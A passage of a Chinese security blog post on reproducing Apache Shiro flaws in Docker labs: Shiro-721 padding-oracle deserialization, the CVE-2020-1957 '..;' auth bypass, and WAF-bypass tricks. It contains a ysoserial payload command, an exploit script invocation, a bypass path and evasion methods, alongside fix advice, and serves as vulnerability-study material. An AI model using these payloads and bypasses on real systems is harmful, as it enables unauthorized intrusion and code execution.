<code>RCE</code> 了，内存马模块，同样一键注入然后对应远控工具连接复现文章给出了操作方法</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RyZWFtdGhlL2FydGljbGUvZGV0YWlscy8xMjQzOTA1MzE=">多种工具复现</span></p><h4 id="漏洞修复"><a class="anchor" href="#漏洞修复">#</a> 漏洞修复</h4><ul><li>使用高版本的 <code>shrio</code> 不用 <code>1.2.4</code></li><li>加密不使用公开密匙，保证密匙安全性</li></ul><h3 id="shiro-721-cve-2019-12422"><a class="anchor" href="#shiro-721-cve-2019-12422">#</a> Shiro-721 CVE-2019-12422</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMwL2FydGljbGUvZGV0YWlscy8xMjEzMTQ5MjY=">shiro 721 反序列化漏洞复现与原理以及 Padding Oracle Attack 攻击加解密原理</span></p><p><code>Apache Shiro &lt; 1.4.2</code> 在用户进行登录的时候 <code>Shiro</code> 提供 <code>RemenberMe</code> 功能，可以存储 <code>cookie</code> ，期间使用 <code>AES-CBC</code> 对称加密模式进行加解密，加密的 <code>key</code> 是系统随机生成的无法爆破</p><h4 id="padding-oracle-attack填充提示攻击"><a class="anchor" href="#padding-oracle-attack填充提示攻击">#</a> <strong>Padding Oracle Attack（填充提示攻击）</strong></h4><p>如果输入的密文不合法，类库则会抛出异常，这便是一种提示。攻击者可以不断地提供密文，让解密程序给出提示<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>，不断修正，最终得到的所需要的结果。<strong>只根据我们输入的初始向量值和服务器的状态去判断出解密后明文的值</strong>，这就是填充提示攻击，针对 <code>CBC</code> 模式，而不是某一个加密算法；任何分组加密算法，只要使用了 <code>CBC</code> <sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup> 模式，都会受到影响。此类加密算法包括 <code>AES</code> 、 <code>DES</code> 、 <code>3-DES</code> 能够 ** 在不知道密钥的情况下，** 解密任意密文，或者构造出任意明文的合法密文</p><h4 id="漏洞原理-2"><a class="anchor" href="#漏洞原理-2">#</a> 漏洞原理</h4><p>通过 <code>Padding Oracle</code> 加密生成的攻击代码来重新构造一个恶意的 <code>rememberMe</code> 字段，重新请求网站，进行反序列化攻击，最终导致任意代码的执行，攻击者无需知道 <code>rememberMe</code> 的加密密钥<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup></p><h4 id="docker搭建环境"><a class="anchor" href="#docker搭建环境">#</a> Docker 搭建环境</h4><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/inspiringz/Shiro-721.git</span></span><br><span class="line">cd Shiro-<span class="number">721</span>/Docker</span><br><span class="line">docker build -t shiro-<span class="number">721</span> .  <span class="comment">// 构建shiro-721&quot; 的Docker镜像  .为当前目录</span></span><br><span class="line">docker run -p <span class="number">8080</span>:<span class="number">8080</span> -d shiro-<span class="number">721</span> <span class="comment">// 运行名为 &quot;shiro-721&quot; 的Docker容器,并将容器的端口8080映射到主机的端口808</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_zGo-czDTCO.png" alt></p><p>搭建还真废力，在 <code>git</code> 命令行构建的容器 <code>Docker</code> 里面不能使用，于是删除重新构建才成功</p><p><img data-src="image/image_yLNTD2JaK9.png" alt></p><h4 id="漏洞复现-2"><a class="anchor" href="#漏洞复现-2">#</a> 漏洞复现</h4><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成创建0day文件的反序列化文件 payload.class</span></span><br><span class="line"></span><br><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 <span class="string">&quot;touch /tmp/0day&quot;</span> &gt; payload.class </span><br></pre></td></tr></table></figure><p></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2luc3BpcmluZ3ovU2hpcm8tNzIx">shiro721Git 环境 + 复现</span></p><p>利用已知用户密码登录并抓包，将其中的 <code>remember</code> 字段复制下来输入到工具中进行利用，本质感觉还是利用算法填充爆破密匙，再利用密匙生成新的 <code>rememberMe cookie</code> ，我们使用这个 <code>cookie</code> 替换原数据包中的 <code>cookie</code> 登录后服务端会对其进行反序列化执行命令，从而创建 <code>0day</code> 文件造成命令执行</p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.py http:<span class="comment">//192.168.31.169:8080/login.jsp </span></span><br><span class="line">yAmdluN8Y40K7yewnF+xq+s4I5UMwRKqkLsosoPLSO/rGM80KA0wBKD4kLlXqaJ4VnIijbztK</span><br><span class="line">Jld8Srb336wNwlUH+Hc/<span class="number">02</span>+ZnaRq3vlUp8BHhWf3X1UVrGzusihcFZPMyNYbk7+DOtF20685</span><br><span class="line">Ab797ndD+NEdazFBxeerA+YFshgSs/8qrwkjm9xk2S4MdQyAiUyZ5WjiRUENFhg0c9vH/0J67</span><br><span class="line">Pdsmo/beniYMRppPKkpylvy8WRqPOTOb/CGJXs3IArbKpIwQ+zfbj3K6bNmHwF36mrjIcPbk</span><br><span class="line">P7K56eR04uTuYM04jLm/7ssCZ1wCd8xORbXK+3le/2gEpe7M+47XqECURHrXdMzhIm9JVOt3</span><br><span class="line">OPGOf4ddWScJQxtEQJUozoeXMCUPjKTBu0/W5tGzRY4nAvUg4+vYVxr06T8oC9Rgwunrth8N</span><br><span class="line">qylp8NtgLhHrPffRU5wbtlzW68uuX2Af/Lxwz5pG4b/f8CYWY38dTlSC7NqFtYp5un7WZAV</span><br><span class="line">0hmr098 payload.class  <span class="comment">// 反序列化命令文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_clLgjpsodJ.png" alt></p><p>我的命令一直无法成功的执行，构建的 <code>Shiro721</code> 容器附带了 <code>exp</code> 利用文件</p><p><img data-src="image/image_YRyuKGmMLM.png" alt></p><p><img data-src="image/image_3svpUnc7Yj.png" alt></p><h4 id="漏洞修复-2"><a class="anchor" href="#漏洞修复-2">#</a> 漏洞修复</h4><ul><li>需要爆破得到 <code>key</code> ，可以对短时间内多次访问的 <code>IP</code> 实行封禁</li><li>升级至安全版本</li><li>关闭 <code>rememberMe</code> 持久化登录功能</li></ul><h3 id="cve-2020-1957未授权访问"><a class="anchor" href="#cve-2020-1957未授权访问">#</a> CVE-2020-1957 未授权访问</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNzI5Ni9hcnRpY2xlL2RldGFpbHMvMTE5MTA1MTk3">Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞</span></p><h4 id="漏洞原理-3"><a class="anchor" href="#漏洞原理-3">#</a> 漏洞原理</h4><p><code>Spring Boot</code> 中使用 <code>Apache Shiro</code> 进行身份验证、权限控制，可以构造路径利用 <code>Apache Shiro</code> 和 <code>Spring Boot</code> 对 <code>URL</code> 的处理的差异化，绕过 <code>Shiro</code> 对 <code>Spring Boot</code> 中 <code>Server</code> 权限控制实现未授权</p><p><img data-src="image/image_O3WsrMR5_6.png" alt></p><p><img data-src="image/image_ymXKUyZQjU.png" alt></p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 登录页面抓包,访问 /admin 发包</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 响应返回<span class="number">302</span> 选择<span class="number">302</span> 并跳转到登录页面</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 回到网站页面构造恶意请求/xxx/..;/admin/ 发包即可绕过 进入管理员页面</span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_wTI2q_wOKP.png" alt></p><h3 id="shiro有key无链思路"><a class="anchor" href="#shiro有key无链思路">#</a> Shiro 有 key 无链思路</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjA5MTQ1OC9hcnRpY2xlL2RldGFpbHMvMTIzNjg2NTc4">Shiro 无依赖链 —Commons Beanutils_shiro 有 key 无构造链</span></p><h4 id="jrmpclient"><a class="anchor" href="#jrmpclient">#</a> <strong>JRMPClient</strong></h4><blockquote><p><code>JRMP</code> 是 <code>Java</code> 中用于远程过程调用（ <code>RPC</code> ）的协议，它允许在不同的 <code>Java</code> 虚拟机（ <code>JVM</code> ）之间进行方法调用和对象传输</p></blockquote><p>文章显示利用 <code>JRMPClient</code> 远程调用配合 <code>CommonsBeanutils2_18</code> 利用链</p><p><span class="exturl" data-url="aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzI2NzMxNzUuaHRtbA==">实战｜记一次 shiro 有 key 无常规链的打法 JRMPClient 监听</span></p><h4 id="shiro_tooljar"><a class="anchor" href="#shiro_tooljar">#</a> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d5enh4ei9zaGlyb19yY2VfdG9vbA==">shiro_tool.jar </span>检测非常规利用链</h4><p><span class="exturl" data-url="aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzE1NDgxOTEuaHRtbA==">工具利用文章</span></p><h3 id="绕waf"><a class="anchor" href="#绕waf">#</a> 绕 WAF</h3><p>绕 <code>WAF</code> 根本是让 <code>WAF</code> 解析不了但是发送到后端可以正常解析</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzcxNjkyNjgyL2FydGljbGUvZGV0YWlscy8xMzgxNzQzNTc=">第 91 篇：shiro 反序列化漏洞绕 waf 防护的方法总结（上篇</span></p><h4 id="http请求随机"><a class="anchor" href="#http请求随机">#</a> HTTP 请求随机</h4><p><span class="exturl" data-url="aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzQ5OTQxOC5odG1s">shiro 反序列化绕 WAF 之未知 HTTP 请求方法</span></p><p>修改正常的 <code>HTTP</code> 请求方法为随机字符，<strong> 添加垃圾字符这种方法和</strong> ** <code>Web</code> **<strong> 应用中间件有关</strong>，部分中间件不适用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET =====&gt;  xxxxT</span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_BBXj0CHNaC.png" alt></p><h4 id="http请求方法置空"><a class="anchor" href="#http请求方法置空">#</a> <strong>HTTP 请求方法置空</strong></h4><p><code>tomcat</code> 中间件将请求方法置空也是可以正常发包并显示执行结果的，这种 ** 畸形的数据包在 **** <code>WAF</code> **<strong> 设备会被放行，因为不被解析</strong>，绕过也是跟中间件有关， <code>Weblogic</code> 中间件不适用</p><p><img data-src="image/image_7yRuFB1PtD.png" alt></p><h4 id="shiro数据包添加脏空数据"><a class="anchor" href="#shiro数据包添加脏空数据">#</a> <strong>Shiro 数据包添加脏 / 空数据</strong></h4><p><code>RememberMe</code> 数据包记住我字段添加特殊脏数据仍然是可以正常发包的，如 <code>、`</code> 这种特殊符号，<strong> 原因是</strong> ** <code>shiro</code> **<strong> 组件处理特殊符号会替换为空</strong>，或是使用 <code>TAB</code> 换行功能也是可以执行命令</p><p><img data-src="image/image_zDCSEwJs88.png" alt></p><p><img data-src="image/image_ZttDnWV2P3.png" alt></p><h4 id="host头域名变ip地址"><a class="anchor" href="#host头域名变ip地址">#</a> <strong>Host 头域名变 IP 地址</strong></h4><p>甲方公司购买的是 <code>waf/云waf</code> 或只对特定的网站域名进行防护 <strong>并没有对域名解析出的</strong> ** <code>IP</code> **<strong> 防护</strong></p><p>我们可以 <code>ping</code> 此域名得到 <code>IP</code> , 在 <code>BP</code> 数据包的 <code>Host</code> 头进行替换</p><p><img data-src="image/image_RpMIImqTHg.png" alt></p><h4 id="base64解码绕waf"><a class="anchor" href="#base64解码绕waf">#</a> Base64 解码绕 WAF</h4><p>文章中测试了各个语言对于 <code>base64</code> 解码的情况，如果是 <code>shiro</code> 在 <code>Base64</code> 编码后生成的 <code>cookie</code> 再写入新的垃圾字符，发送到后端如果 <code>WAF</code> 不解码，但是后端对垃圾字符忽略仍然可以触发 <code>paylaod</code> 这也是核心</p><p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUDVoOV9LNFljdnNyVTR0c2RIc0pkUQ==">各个语言 Base64 编码绕过 WAF</span></p><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">针对情况:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> waf不能解码垃圾字符，但是后端可以解码顺利绕过,后端可以忽略这些垃圾字符   <span class="comment">// 普通情况</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> waf虽然解码,但是只解码可以解码的,恶意的payload还是会被后端解码</span><br></pre></td></tr></table></figure><p></p><p><img data-src="image/image_PjcdFLjcoF.png" alt></p><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>感觉还是默认密匙泄露伪造 cookie 字段，服务端反序列化 cookie 所以产生了漏洞 <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>只要 rememberMe 的 AES 加密密钥泄漏，无论 Shiro 什么版本都会导致反序列化漏洞，由于 AES 加密是对称式加密（key 既能加密数据也能解密数据） <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p>提示是如果 <code>key</code> 正确，则返回包中不会有 <code>rememberMe=DeleteMe</code> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p>分组链接模式，目的是为了使原本独立的分组密码加密过程形成迭代，** 使每次加密的结果影响到下一次加密 ** <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p>存在 <code>Padding Oracle Attack</code> 漏洞，已登录的攻击者同样可进行反序列化操作。 <a href="#fnref5" class="footnote-backref">↩︎</a></p></li></ol></section></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2024-09-19 17:40:43" itemprop="dateModified" datetime="2024-09-19T17:40:43+08:00">2024-09-19</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>月 <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://lunargod.github.io/2023/01/29/Apache%20%20Shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Apache  Shiro 反序列化">https://lunargod.github.io/2023/01/29/Apache Shiro 反序列化/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/01/02/Jboss%E6%9C%AA%E6%8E%88%E6%9D%83/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;67384d01d29ded1a8c7b4dab.jpg" title="Jboss未授权 CVE-2017-7504"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 漏洞复现</span><h3>Jboss未授权 CVE-2017-7504</h3></a></div><div class="item right"><a href="/2023/03/29/Strust2RCE/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;pic.imgdb.cn&#x2F;item&#x2F;6738468cd29ded1a8c756b4c.jpg" title="S2-001 RCE"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 漏洞复现</span><h3>S2-001 RCE</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-550-cve-2016-4437"><span class="toc-number">1.</span> <span class="toc-text">Shiro-550 CVE-2016-4437</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理[1]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker%E5%BC%80%E5%90%AF%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">Docker 开启环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">工具复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-721-cve-2019-12422"><span class="toc-number">2.</span> <span class="toc-text">Shiro-721 CVE-2019-12422</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#padding-oracle-attack%E5%A1%AB%E5%85%85%E6%8F%90%E7%A4%BA%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.</span> <span class="toc-text">Padding Oracle Attack（填充提示攻击）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#docker%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">2.3.</span> <span class="toc-text">Docker 搭建环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">2.5.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2020-1957%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">3.</span> <span class="toc-text">CVE-2020-1957 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E6%9C%89key%E6%97%A0%E9%93%BE%E6%80%9D%E8%B7%AF"><span class="toc-number">4.</span> <span class="toc-text">Shiro 有 key 无链思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jrmpclient"><span class="toc-number">4.1.</span> <span class="toc-text">JRMPClient</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shiro_tooljar"><span class="toc-number">4.2.</span> <span class="toc-text">shiro_tool.jar 检测非常规利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95waf"><span class="toc-number">5.</span> <span class="toc-text">绕 WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E8%AF%B7%E6%B1%82%E9%9A%8F%E6%9C%BA"><span class="toc-number">5.1.</span> <span class="toc-text">HTTP 请求随机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%E7%BD%AE%E7%A9%BA"><span class="toc-number">5.2.</span> <span class="toc-text">HTTP 请求方法置空</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shiro%E6%95%B0%E6%8D%AE%E5%8C%85%E6%B7%BB%E5%8A%A0%E8%84%8F%E7%A9%BA%E6%95%B0%E6%8D%AE"><span class="toc-number">5.3.</span> <span class="toc-text">Shiro 数据包添加脏 &#x2F; 空数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#host%E5%A4%B4%E5%9F%9F%E5%90%8D%E5%8F%98ip%E5%9C%B0%E5%9D%80"><span class="toc-number">5.4.</span> <span class="toc-text">Host 头域名变 IP 地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E8%A7%A3%E7%A0%81%E7%BB%95waf"><span class="toc-number">5.5.</span> <span class="toc-text">Base64 解码绕 WAF</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2023/01/02/Jboss%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="bookmark" title="Jboss未授权 CVE-2017-7504">Jboss未授权 CVE-2017-7504</a></li><li class="active"><a href="/2023/01/29/Apache%20%20Shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="Apache  Shiro 反序列化">Apache Shiro 反序列化</a></li><li><a href="/2023/03/29/Strust2RCE/" rel="bookmark" title="S2-001 RCE">S2-001 RCE</a></li><li><a href="/2024/07/01/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" rel="bookmark" title="Redis未授权访问+工具复现">Redis未授权访问+工具复现</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="月" data-src="/images/avatar.jpg"><p class="name" itemprop="name">月</p><div class="description" itemprop="description">欢迎来到月的个人博客!</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">21</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">6</span> <span class="name">分类</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL0x1bmFSR29k" title="https:&#x2F;&#x2F;github.com&#x2F;LunaRGod"><i class="ic i-github"></i></span> <span class="exturl item twitter" data-url="aHR0cHM6Ly94LmNvbS95dWVzZTEwMjkxMDQ1Mw==" title="https:&#x2F;&#x2F;x.com&#x2F;yuese102910453"><i class="ic i-twitter"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS9mZW5nLWppYW4tNDgtNjc=" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;feng-jian-48-67"><i class="ic i-zhihu"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE2NjY5MDk3ODQ=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1666909784"><i class="ic i-cloud-music"></i></span> <span class="exturl item email" data-url="bWFpbHRvOnNhYmVyMGRheUBxcS5jb20=" title="mailto:saber0day@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2023/01/02/Jboss%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/03/29/Strust2RCE/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/" title="分类于 内网攻防">内网攻防</a></div><span><a href="/2024/07/09/WMI%20%20SMB%20%20%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/" title="WMI SMB  密码喷洒">WMI SMB 密码喷洒</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 漏洞复现">漏洞复现</a></div><span><a href="/2023/01/02/Jboss%E6%9C%AA%E6%8E%88%E6%9D%83/" title="Jboss未授权 CVE-2017-7504">Jboss未授权 CVE-2017-7504</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2023/05/01/%E5%A4%9A%E7%BA%BF%E7%A8%8B/" title="Java--多线程">Java--多线程</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div><span><a href="/2024/03/29/JS%E9%80%86%E5%90%91-%E6%9E%84%E9%80%A0/" title="JSFuzz-逆向构造数据包">JSFuzz-逆向构造数据包</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2023/05/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java--反序列化">Java--反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2023/03/31/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/" title="Java--反射机制">Java--反射机制</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div><span><a href="/2024/02/19/%E5%8A%A0%E8%A7%A3%E5%AF%86/" title="加解密算法逆向密文">加解密算法逆向密文</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div><span><a href="/2024/05/19/%E4%BA%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/" title="云安全攻防">云安全攻防</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/" title="分类于 内网攻防">内网攻防</a></div><span><a href="/2024/08/01/%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95IPC/" title="远程登录IPC">远程登录IPC</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/" title="分类于 内网隧道代理">内网隧道代理</a></div><span><a href="/2024/05/15/%E4%BB%A3%E7%90%86%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF-%20%20CS-MSF%E4%BB%A3%E7%90%86%E8%B7%B3%E6%9D%BF/" title="代理软件 &amp; CS&#x2F;MSF代理跳板">代理软件 & CS/MSF代理跳板</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2023 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">月 @ SABER</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2023/01/29/Apache  Shiro 反序列化/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>